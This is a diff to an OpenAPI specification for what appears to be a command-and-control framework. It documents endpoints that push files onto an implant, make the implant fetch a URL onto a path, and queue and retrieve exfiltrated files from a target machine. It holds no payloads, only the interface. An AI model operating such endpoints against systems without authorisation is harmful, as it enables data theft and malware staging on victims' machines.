@@ -652,8 +652,8 @@ paths:
   /agents/{id}/upload:
     post:
       tags: [Files, Agents]
-      summary: Upload file to agent
-      description: Upload a file to the agent filesystem
+      summary: Push a file onto the implant
+      description: Operator-to-implant push. Multipart file is written on the next beacon. Use target_path (path is accepted as an alias).
       operationId: uploadFile
       security:
         - SessionCookie: []
@@ -669,14 +669,17 @@ paths:
           multipart/form-data:
             schema:
               type: object
-              required: [file, path]
+              required: [file]
               properties:
                 file:
                   type: string
                   format: binary
+                target_path:
+                  type: string
+                  description: Destination file path on the implant
                 path:
                   type: string
-                  description: Destination path on agent
+                  description: Alias for target_path
       responses:
         '200':
           description: Upload task created
@@ -688,8 +691,8 @@ paths:
   /agents/{id}/download:
     post:
       tags: [Files, Agents]
-      summary: Download file from agent
-      description: Download a file from the agent filesystem
+      summary: Instruct the implant to fetch a URL
+      description: Queues a download_url-style task. The implant fetches `url` onto `path`. This is not operator exfil — use POST /agents/{id}/files/upload then GET /agents/{id}/files/exfil/{filename}.
       operationId: downloadFile
       security:
         - SessionCookie: []
@@ -705,11 +708,14 @@ paths:
           application/x-www-form-urlencoded:
             schema:
               type: object
-              required: [path]
+              required: [url, path]
               properties:
+                url:
+                  type: string
+                  description: HTTP(S) URL the implant should fetch
                 path:
                   type: string
-                  description: File path to download
+                  description: Destination path on the implant
       responses:
         '200':
           description: Download task created
@@ -7010,10 +7016,63 @@ paths:
         '200':
           description: OK
 
+  /agents/{id}/files/push:
+    post:
+      tags: [Files, Agents]
+      summary: Push a file onto the implant (alias of POST /upload)
+      operationId: post_agents_id_files_push
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      requestBody:
+        content:
+          multipart/form-data:
+            schema:
+              type: object
+              required: [file]
+              properties:
+                file: { type: string, format: binary }
+                target_path: { type: string }
+                path: { type: string }
+      responses:
+        '200':
+          description: Push task queued
+
+  /agents/{id}/files/pull:
+    post:
+      tags: [Files, Agents]
+      summary: Queue implant-to-server exfil (alias of POST /files/upload)
+      operationId: post_agents_id_files_pull
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      requestBody:
+        content:
+          application/x-www-form-urlencoded:
+            schema:
+              type: object
+              required: [path]
+              properties:
+                path: { type: string }
+                offset: { type: string }
+                size: { type: string }
+      responses:
+        '200':
+          description: Exfil task queued
+
   /agents/{id}/files/upload:
     post:
-      tags: [Agents]
-      summary: POST /agents/{id}/files/upload
+      tags: [Files, Agents]
+      summary: Queue implant-to-server exfil
+      description: Path only. Do not attach a file. The implant reads the remote path and the chunk is saved under data/uploads/{id}/. Then GET /agents/{id}/files/exfil/{filename}.
       operationId: post_agents_id_files_upload
       security:
         - SessionCookie: []
@@ -7022,9 +7081,42 @@ paths:
           in: path
           required: true
           schema: { type: string }
+      requestBody:
+        content:
+          application/x-www-form-urlencoded:
+            schema:
+              type: object
+              required: [path]
+              properties:
+                path: { type: string }
+                offset: { type: string }
+                size: { type: string }
       responses:
         '200':
-          description: OK
+          description: Exfil task queued
+
+  /agents/{id}/files/exfil/{filename}:
+    get:
+      tags: [Files, Agents]
+      summary: Download a previously exfiltrated file
+      operationId: get_agents_id_files_exfil
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+        - name: filename
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: Saved exfil blob
+          content:
+            application/octet-stream:
+              schema: { type: string, format: binary }
 
   /agents/{id}/find:
     post:
